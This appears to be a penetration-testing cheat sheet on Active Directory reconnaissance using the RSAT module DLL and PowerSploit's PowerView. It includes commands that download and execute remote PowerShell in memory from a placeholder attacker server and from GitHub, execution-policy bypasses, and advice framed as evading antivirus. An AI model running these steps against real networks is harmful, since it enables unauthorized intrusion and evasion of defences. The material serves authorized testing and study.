# Active Directory - Overview

### Remote Server Administration Tools (RSAT)

The `Remote Server Administration Tools (RSAT)` suite includes a number of
utilities useful for Active Directory reconnaissance and notably the
`Active-Directory` module for Windows PowerShell. The `Active-Directory` module
consolidates a group of cmdlets, that can be used to retrieve information and
manage Active Directory domains.  

While RSAT requires Administrator level-privileges to be installed, the DLL
`Microsoft.ActiveDirectory.Management.dll` can be directly imported from an
unprivileged user session. The DLL is usually located at the following path:
`C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\[...]`.

Once the DLL has been uploaded to the target, or made accessible on a network
share, the Active Directory module can be imported:

```
Import-Module <PATH\Microsoft.ActiveDirectory.Management.dll>
```

The `Import-ActiveDirectory.ps1` PowerShell script, in-lining
the `Microsoft.ActiveDirectory.Management.dll`, may also be used to import the
Active Directory module:

```
iex (new-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Import-ActiveDirectory.ps1'); Import-ActiveDirectory
```

###### PowerSploit PowerView

`PowerView` is a PowerShell tool to gain network situational awareness on
Windows domains. It contains a set of pure-PowerShell replacements for various
windows "net" commands, which utilize PowerShell AD hooks and underlying Win32
API functions to perform useful Windows domain functionality.

It also implements various useful metafunctions, including some custom-written
user-hunting functions which will identify where on the network specific users
are logged into. It can also check which machines on the domain the current
user has local administrator access on. Several functions for the enumeration
and abuse of domain trusts also exist.

The `dev` branch has the most up-to-date cmdlets:
` git clone --single-branch --branch dev https://github.com/PowerShellMafia/PowerSploit.git`

```
# PowerShell by default will not allow execution of PowerShell scripts
powershell.exe -ExecutionPolicy bypass powershell.exe
Set-ExecutionPolicy -Force -Scope CurrentUser -ExecutionPolicy Bypass

Import-Module <PATH\PowerView.ps1>
```

`PowerSploit` can trigger antivirus software. To bypass such controls, inject
it directly in memory:

```
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials

# Master fork - Stable
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Empire fork - Maintained
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
```
